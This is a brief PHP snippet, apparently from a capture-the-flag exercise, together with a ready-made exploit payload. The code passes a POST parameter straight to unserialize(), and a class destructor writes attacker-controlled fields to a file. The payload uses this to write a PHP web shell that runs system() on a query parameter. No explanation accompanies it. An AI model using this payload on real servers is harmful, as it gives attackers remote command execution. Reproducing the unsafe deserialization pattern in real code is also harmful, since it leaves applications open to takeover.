```php
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);


	class AdminFeatures
	{

		public $log_file = '';
		public $author_name = '';
					
		public function __construct()
		{

			$this->dict_data = ['1' => 'Albert Einstein', '2' => 'Karl Marx','3' => 'Ralph Waldo Emerson','4' => 'Phytagoras','5' => 'Aristotle','6' => 'Vladimir Lenin','7' => 'Thomas Alva Edison','8' => 'Plato','9' => 'Herodotus','10' => 'Alexander the Great'];

			$this->log_file = 'vote_result.txt';
```

```php
			if (isset($_POST['submit'])){

				$author_id = $_POST['quotes_id'];

				$this->author_name = $this->dict_data[$author_id];

				
			}
			

		}


		public function __destruct()
		{

			$this->rand_string = substr(md5(openssl_random_pseudo_bytes(20)),-32);

			file_put_contents(__DIR__ . '/result/'. $this->rand_string . '_' . $this->log_file, $this->author_name);

			$_SESSION['filename'] = $this->rand_string . '_' . $this->log_file;


		}
```

```php
}

	$input = $_POST['test_admin_parameter_56425342'] ?? '';
	$test_feature = unserialize($input);

	$writer = new AdminFeatures;


?>
```

```
payload:
O:13:"AdminFeatures":3:{s:8:"log_file";s:4:".php";s:11:"author_name";s:28:"<?php system($_GET['a']); ?>";s:9:"dict_data";a:10:{i:1;s:15:"Albert Einstein";i:2;s:9:"Karl Marx";i:3;s:19:"Ralph Waldo Emerson";i:4;s:10:"Phytagoras";i:5;s:9:"Aristotle";i:6;s:14:"Vladimir Lenin";i:7;s:18:"Thomas Alva Edison";i:8;s:5:"Plato";i:9;s:9:"Herodotus";i:10;s:19:"Alexander the Great";}}
```